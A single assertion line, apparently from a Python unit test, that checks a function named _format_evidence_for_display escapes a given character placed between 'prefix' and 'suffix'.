    assert _format_evidence_for_display(f"prefix{character}suffix") == f"prefix{escaped}suffix"
